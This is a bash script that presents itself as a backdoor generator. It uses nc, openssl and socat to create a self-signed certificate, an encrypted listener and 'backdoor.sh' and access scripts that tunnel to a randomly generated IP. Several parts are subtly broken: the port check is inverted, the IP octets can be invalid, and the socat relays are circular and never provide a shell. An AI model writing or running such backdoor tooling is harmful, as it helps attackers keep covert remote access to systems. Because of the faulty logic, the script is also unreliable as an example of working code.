#!/bin/bash

# Function to check if a port is available
function is_port_available() {
  nc -z -w1 "$1" "$2" >/dev/null 2>&1
  return $?
}

# Find an available port
PORT=8000
while ! is_port_available "localhost" "$PORT"; do
  ((PORT++))
done

# Generate a random IP address
IP_ADDRESS=$(head /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1).$(head /dev/urandom | tr -dc '0-9' | fold -w 3 | head -n 1).$(head /dev/urandom | tr -dc '0-9' | fold -w 3 | head -n 1).$(head /dev/urandom | tr -dc '1-9' | fold -w 3 | head -n 1)

SERVER_IP="$IP_ADDRESS"
OUTPUT_FILE="$SERVER_IP.sh"
BACKDOOR_FILE="backdoor.sh"
CERT_FILE="server.crt"
KEY_FILE="server.key"

# Generate self-signed SSL/TLS certificate and key files
openssl req -x509 -newkey rsa:4096 -keyout "$KEY_FILE" -out "$CERT_FILE" -days 365 -subj "/CN=$SERVER_IP" -nodes

# Create a new shell script file with a random filename for the backdoor
{
  echo "#!/bin/bash"
  echo ""
  echo "# Connect to the server as a client"
  echo "socat TCP:$SERVER_IP:$PORT openssl-connect:$SERVER_IP:$PORT,verify=0 &"
} > "$BACKDOOR_FILE"

# Make the backdoor script file executable
chmod +x "$BACKDOOR_FILE"

# Start the server with encryption and tunneling using socat
socat OPENSSL-LISTEN:$PORT,cert="$CERT_FILE",key="$KEY_FILE",fork TCP:$SERVER_IP:$PORT,verify=0 &

# Sleep for a moment to allow the server to start
sleep 1

# Create a new shell script file with a random filename for access to the backdoor
{
  echo "#!/bin/bash"
  echo ""
  echo "# Start the backdoor script"
  echo "./$BACKDOOR_FILE"
} > "$OUTPUT_FILE"

# Make the access script file executable
chmod +x "$OUTPUT_FILE"

echo "Backdoor script created: $BACKDOOR_FILE"
echo "Access script created: $OUTPUT_FILE"
